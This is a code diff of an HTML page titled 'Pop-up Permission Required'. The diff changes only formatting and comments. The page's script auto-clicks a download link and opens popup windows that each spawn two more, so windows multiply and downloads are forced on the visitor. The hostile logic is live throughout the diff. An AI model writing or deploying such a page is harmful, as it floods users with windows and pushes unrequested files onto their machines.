@@ -5,23 +5,23 @@
   <title>Pop-up Permission Required</title>
   <script>
     function openPopup() {
-  const width = 500;
-  const height = 400;
+      const width = 500;
+      const height = 400;
 
-  const left = window.screen.availWidth - width - 10; // top-right corner
-  const top = 10;
+      const left = window.screen.availWidth - width - 10; // 10 px from right edge
+      const top = 10; // 10 px from top edge
 
-  const popup = window.open(
-    window.location.href + "?popup=true",
-    "_blank",
-    `width=${width},height=${height},left=${left},top=${top}`
-  );
+      const popup = window.open(
+        window.location.href + "?popup=true",
+        "_blank",
+        `width=${width},height=${height},left=${left},top=${top}`
+      );
 
-  if (popup) {
-    popup.focus();
-    window.blur();
-  }
-}
+      if (popup) {
+        popup.focus();
+        window.blur();
+      }
+    }
 
     window.onload = function () {
       const isPopup = new URLSearchParams(window.location.search).has('popup');
@@ -50,7 +50,7 @@
         const download = document.getElementById('downloadLink');
         download.click();
 
-        // Immediately open 2 more popups
+        // Immediately open 2 more popups at top-right
         openPopup();
         openPopup();
 
@@ -67,7 +67,7 @@
           <p>Thank you for your understanding.</p>
         `;
 
-        // Initial popup spawn
+        // Open initial popup at top-right
         openPopup();
       }
     };
